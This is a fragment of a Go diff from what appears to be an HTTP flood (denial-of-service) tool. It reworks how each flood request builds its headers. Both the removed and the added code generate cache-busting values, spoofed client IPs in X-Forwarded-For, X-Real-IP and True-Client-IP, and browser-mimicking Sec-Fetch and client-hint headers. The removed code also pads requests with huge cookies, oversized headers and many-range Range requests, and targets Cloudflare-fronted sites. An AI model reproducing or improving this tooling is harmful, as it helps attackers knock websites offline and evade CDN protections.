-						headerMap["User-Agent"] = prof.UA
-						headerMap["Accept"] = prof.Accept
-						headerMap["Accept-Language"] = prof.Lang
-						headerMap["Accept-Encoding"] = prof.Encoding
-						headerMap["Connection"] = "keep-alive"
-						headerMap["Cache-Control"] = "no-cache, no-store, must-revalidate"
-						headerMap["Pragma"] = "no-cache"
-						headerMap["Upgrade-Insecure-Requests"] = "1"
-						headerMap["If-Modified-Since"] = ifModifiedSince
-						headerMap["X-Cache-Buster"] = strconv.FormatInt(subRng.Int63(), 16)
+						req.Header.Set("User-Agent", ua)
+						req.Header.Set("Accept", ACCEPT)
+						req.Header.Set("Accept-Language", lang)
+						req.Header.Set("Accept-Encoding", enc)
+						req.Header.Set("Connection", "keep-alive")
+						req.Header.Set("Cache-Control", ctrl)
+						req.Header.Set("Pragma", "no-cache")
+						req.Header.Set("Upgrade-Insecure-Requests", "1")
+						req.Header.Set("If-Modified-Since", time.Now().AddDate(1, 0, 0).Format(time.RFC1123))
+						req.Header.Set("X-Cache-Buster", fmt.Sprintf("%x", rand.Int63()))
 
-						if cdnType == "cloudflare" {
-							if caps.Headers["X-Original-URL"] && subRng.Intn(3) == 0 {
-								headerMap["X-Original-URL"] = "/" + strconv.FormatInt(subRng.Int63(), 16)
-							}
-							if caps.Headers["X-Forwarded-Host"] && subRng.Intn(3) == 0 {
-								headerMap["X-Forwarded-Host"] = strconv.FormatInt(subRng.Int63(), 16) + ".example.com"
-							}
-							if caps.Headers["X-Request-ID"] && subRng.Intn(3) == 0 {
-								headerMap["X-Request-ID"] = strconv.FormatInt(subRng.Int63(), 16)
-							}
-							if caps.Headers["CF-Connecting-IP"] && subRng.Intn(5) == 0 {
-								headerMap["CF-Connecting-IP"] = cli.ip
-							}
-							if caps.Headers["True-Client-IP"] && subRng.Intn(5) == 0 {
-								headerMap["True-Client-IP"] = cli.ip
-							}
-							if caps.Headers["CDN-Loop"] && subRng.Intn(5) == 0 {
-								headerMap["CDN-Loop"] = "cloudflare"
-							}
-							for h, supported := range caps.Headers {
-								if !supported {
-									continue
-								}
-								if subRng.Intn(3) != 0 {
-									continue
-								}
-								switch h {
-								case "X-Original-URL", "X-Forwarded-Host", "X-Request-ID", "CDN-Loop", "CF-Connecting-IP", "True-Client-IP":
-									continue
-								case "X-Client-IP", "X-Remote-IP", "X-Originating-IP":
-									headerMap[h] = cli.ip
-								case "X-Forwarded-Proto":
-									headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
-								case "X-Forwarded-Port":
-									headerMap[h] = strconv.Itoa(80 + subRng.Intn(100))
-								case "X-Forwarded-Scheme":
-									headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
-								case "X-Requested-With":
-									headerMap[h] = "XMLHttpRequest"
-								case "Accept-Charset":
-									headerMap[h] = "utf-8, iso-8859-1;q=0.5"
-								case "Accept-Datetime":
-									headerMap[h] = time.Now().Add(-time.Duration(subRng.Intn(3600)) * time.Second).Format(time.RFC1123)
-								case "From":
-									headerMap[h] = RST(subRng, 8) + "@example.com"
-								case "Max-Forwards":
-									headerMap[h] = strconv.Itoa(1 + subRng.Intn(10))
-								case "Via":
-									headerMap[h] = fmt.Sprintf("1.1 proxy-%d.example.com", subRng.Intn(100))
-								case "Warning":
-									headerMap[h] = fmt.Sprintf("%d %s", 100+subRng.Intn(20), RST(subRng, 10))
-								case "DNT":
-									headerMap[h] = "1"
-								case "Upgrade":
-									headerMap[h] = "websocket"
-								case "Save-Data":
-									headerMap[h] = "on"
-								case "X-HTTP-Method-Override":
-									headerMap[h] = []string{"PUT", "DELETE", "PATCH"}[subRng.Intn(3)]
-								case "X-Cache":
-									headerMap[h] = []string{"MISS", "HIT", "EXPIRED"}[subRng.Intn(3)]
-								default:
-								}
-							}
+						if rand.Intn(3) == 0 {
+							req.Header.Set("X-Original-URL", "/"+fmt.Sprintf("%x", rand.Int63()))
 						}
-
-						if subRng.Intn(2) == 0 {
-							randHeader := "X-" + RST(subRng, 8)
-							headerMap[randHeader] = RST(subRng, 16)
-						}
-
-						if subRng.Intn(4) == 0 {
-							bigCookie := "big=" + strings.Repeat("x", 512+subRng.Intn(1024))
-							if existing, ok := headerMap["Cookie"]; ok {
-								headerMap["Cookie"] = existing + "; " + bigCookie
-							} else {
-								headerMap["Cookie"] = bigCookie
-							}
-						}
-
-						if subRng.Intn(3) == 0 {
-							cookie2 := "big2=" + strings.Repeat("x", 2048+subRng.Intn(4096))
-							if existing, ok := headerMap["Cookie"]; ok {
-								headerMap["Cookie"] = existing + "; " + cookie2
-							} else {
-								headerMap["Cookie"] = cookie2
-							}
-						}
-
-						if subRng.Intn(2) == 0 {
-							for i := 0; i < 10; i++ {
-								if existing, ok := headerMap["Cookie"]; ok {
-									headerMap["Cookie"] = existing + "; " + RST(subRng, 8) + "=" + RST(subRng, 16)
-								} else {
-									headerMap["Cookie"] = RST(subRng, 8) + "=" + RST(subRng, 16)
-								}
-							}
-						}
-
-						if subRng.Intn(4) == 0 {
-							ref := REF[subRng.Intn(len(REF))]
-							ref += RST(subRng, 16) + "=" + strings.Repeat("x", 512+subRng.Intn(1024))
-							headerMap["Referer"] = ref
-						}
-
-						if caps.Range && subRng.Intn(3) == 0 {
-							start := subRng.Intn(10000)
-							end := start + 10000000 + subRng.Intn(50000000)
-							headerMap["Range"] = fmt.Sprintf("bytes=%d-%d", start, end)
-							if caps.IfRange && subRng.Intn(2) == 0 {
-								if subRng.Intn(2) == 0 {
-									headerMap["If-Range"] = `"` + RST(subRng, 16) + `"`
-								} else {
-									past := time.Now().Add(-time.Duration(subRng.Intn(86400)) * time.Second).Format(time.RFC1123)
-									headerMap["If-Range"] = past
-								}
-							}
-						}
-
-						if subRng.Intn(5) == 0 {
-							headerMap["X-Real-IP"] = cli.ip
-						}
-
-						if maxHeader > 0 && subRng.Intn(2) == 0 {
-							size := maxHeader/2 + subRng.Intn(maxHeader/2)
-							if size < 1 {
-								size = 512
-							}
-							headerMap["X-Large-Data"] = strings.Repeat("x", size)
-						}
-
-						if subRng.Intn(2) == 0 {
-							headerMap["X-Large-Data-2"] = strings.Repeat("x", 4096+subRng.Intn(8192))
-						}
-
-						if subRng.Intn(3) == 0 {
-							headerMap["X-Forwarded-For"] = RIP(subRng) + "," + RIP(subRng) + "," + RIP(subRng)
+						if rand.Intn(3) == 0 {
+							req.Header.Set("X-Forwarded-Host", fmt.Sprintf("%x.example.com", rand.Int63()))
 						}
 
 						var cookies []string
-						if customCookie != "" {
-							cookies = append(cookies, customCookie)
-						}
 						for _, name := range COOKIES {
-							if subRng.Intn(2) == 0 {
-								cookies = append(cookies, name+"="+strconv.FormatInt(subRng.Int63(), 16))
+							if rand.Intn(2) == 0 {
+								cookies = append(cookies, name+"="+fmt.Sprintf("%x", rand.Int63()))
 							}
 						}
 						if len(cookies) > 0 {
-							if existing, ok := headerMap["Cookie"]; ok {
-								headerMap["Cookie"] = existing + "; " + strings.Join(cookies, "; ")
-							} else {
-								headerMap["Cookie"] = strings.Join(cookies, "; ")
+							req.Header.Set("Cookie", strings.Join(cookies, "; "))
+						}
+
+						if rand.Intn(8) != 0 {
+							ref := REF[rand.Intn(len(REF))]
+							req.Header.Set("Referer", ref+host)
+						}
+
+						if strings.Contains(ua, "Chrome/") || strings.Contains(ua, "Edg/") || strings.Contains(ua, "OPR/") {
+							scu, scm, scp := HIN(ua)
+							if scu != "" {
+								req.Header.Set("Sec-Ch-Ua", scu)
+								req.Header.Set("Sec-Ch-Ua-Mobile", scm)
+								req.Header.Set("Sec-Ch-Ua-Platform", scp)
 							}
 						}
-
-						if subRng.Intn(8) != 0 {
-							ref := REF[subRng.Intn(len(REF))]
-							headerMap["Referer"] = ref + host
-						}
-
-						if prof.SecChUa != "" {
-							headerMap["Sec-Ch-Ua"] = prof.SecChUa
-							headerMap["Sec-Ch-Ua-Mobile"] = prof.SecChUaMov
-							headerMap["Sec-Ch-Ua-Platform"] = prof.SecChUaPlat
-						}
-
-						headerMap["Sec-Fetch-Site"] = "none"
-						headerMap["Sec-Fetch-Mode"] = "navigate"
-						headerMap["Sec-Fetch-Dest"] = "document"
-
-						if subRng.Intn(4) == 0 {
-							headerMap["Expect"] = "100-continue"
-						}
-
-						if subRng.Intn(5) == 0 {
-							headerMap["Connection"] = "close"
-						}
-
-						if subRng.Intn(2) == 0 {
-							ips := make([]string, 10)
-							for j := 0; j < 10; j++ {
-								ips[j] = RIP(subRng)
-							}
-							headerMap["X-Forwarded-For"] = strings.Join(ips, ", ")
-						}
-
-						if subRng.Intn(2) == 0 {
-							var cookies2 []string
-							for j := 0; j < 30; j++ {
-								cookies2 = append(cookies2, RST(subRng, 8)+"="+RST(subRng, 16))
-							}
-							if existing, ok := headerMap["Cookie"]; ok {
-								headerMap["Cookie"] = existing + "; " + strings.Join(cookies2, "; ")
-							} else {
-								headerMap["Cookie"] = strings.Join(cookies2, "; ")
-							}
-						}
-
-						if caps.Range && subRng.Intn(3) == 0 {
-							var ranges []string
-							for j := 0; j < 5; j++ {
-								start := subRng.Intn(10000)
-								end := start + 10000000 + subRng.Intn(50000000)
-								ranges = append(ranges, fmt.Sprintf("%d-%d", start, end))
-							}
-							headerMap["Range"] = "bytes=" + strings.Join(ranges, ", ")
-						}
-
-						if subRng.Intn(2) == 0 {
-							types := []string{
-								"text/html", "application/xhtml+xml", "application/xml", "image/avif",
-								"image/webp", "image/apng", "application/json", "application/javascript",
-								"text/css", "text/plain", "font/woff2", "font/woff", "image/svg+xml",
-								"video/mp4", "video/webm", "audio/mpeg", "application/octet-stream",
-								"multipart/form-data", "application/x-www-form-urlencoded", "application/pdf",
-							}
-							for i, t := range types {
-								types[i] = t + ";q=" + fmt.Sprintf("%.1f", 0.1+subRng.Float64()*0.9)
-							}
-							headerMap["Accept"] = strings.Join(types, ", ")
-						}
-
-						if subRng.Intn(2) == 0 {
-							langs := []string{"en-US", "en", "id", "ja", "ko", "zh-CN", "zh-TW", "de", "fr", "es", "pt", "ru", "ar", "hi", "it"}
-							for i, l := range langs {
-								langs[i] = l + ";q=" + fmt.Sprintf("%.1f", 0.1+subRng.Float64()*0.9)
-							}
-							headerMap["Accept-Language"] = strings.Join(langs, ", ")
-						}
-
-						if subRng.Intn(2) == 0 {
-							directives := []string{"no-cache", "no-store", "must-revalidate", "max-age=0", "private", "public", "no-transform", "proxy-revalidate"}
-							var selected []string
-							for _, d := range directives {
-								if subRng.Intn(2) == 0 {
-									selected = append(selected, d)
-								}
-							}
-							headerMap["Cache-Control"] = strings.Join(selected, ", ")
-						}
-
-						if subRng.Intn(3) == 0 {
-							var etags []string
-							for j := 0; j < 10; j++ {
-								etags = append(etags, `"`+RST(subRng, 16)+`"`)
-							}
-							headerMap["If-None-Match"] = strings.Join(etags, ", ")
-						}
-
-						if subRng.Intn(3) == 0 {
-							var via []string
-							for j := 1; j <= 10; j++ {
-								via = append(via, fmt.Sprintf("%d.%d proxy-%d.example.com", subRng.Intn(10), subRng.Intn(10), j))
-							}
-							headerMap["Via"] = strings.Join(via, ", ")
-						}
-
-						if subRng.Intn(3) == 0 {
-							var warns []string
-							for j := 0; j < 20; j++ {
-								warns = append(warns, fmt.Sprintf("%d %s", 100+subRng.Intn(20), RST(subRng, 10)))
-							}
-							headerMap["Warning"] = strings.Join(warns, ", ")
-						}
-
-						if subRng.Intn(3) == 0 {
-							var hosts []string
-							for j := 0; j < 5; j++ {
-								hosts = append(hosts, RST(subRng, 8)+".example.com")
-							}
-							headerMap["X-Forwarded-Host"] = strings.Join(hosts, ", ")
-						}
-
-						if subRng.Intn(2) == 0 {
-							headerMap["X-Forwarded-For"] = headerMap["X-Forwarded-For"] + ", " + RIP(subRng)
-							headerMap["X-Forwarded-For2"] = RIP(subRng)
-						}
-
-						if subRng.Intn(4) == 0 {
-							headerMap["Expect"] = "100-continue"
-						}
+						req.Header.Set("Sec-Fetch-Site", SITE[rand.Intn(len(SITE))])
+						req.Header.Set("Sec-Fetch-Mode", MODE[rand.Intn(len(MODE))])
+						req.Header.Set("Sec-Fetch-Dest", DEST[rand.Intn(len(DEST))])
 
 						PID := cli.ip
 						if PID == "" {
-							PID = RIP(subRng)
+							PID = ipSpoof()
 						}
-						headerMap["X-Forwarded-For"] = PID
-						headerMap["X-Real-IP"] = PID
-
-						for k, v := range headerMap {
-							req.Header.Set(k, v)
-						}
+						req.Header.Set("X-Forwarded-For", PID)
+						req.Header.Set("X-Real-IP", PID)
+						req.Header.Set("True-Client-IP", PID)
 
 						resp, err := cli.client.Do(req)
 						if err == nil {
@@ -859,10 +404,10 @@ func main() {
 							resp.Body.Close()
 						}
 					}
-				}(s)
+				}()
 			}
 			swg.Wait()
-		}(c, i)
+		}(c)
 	}
 
 	sig := make(chan os.Signal, 1)
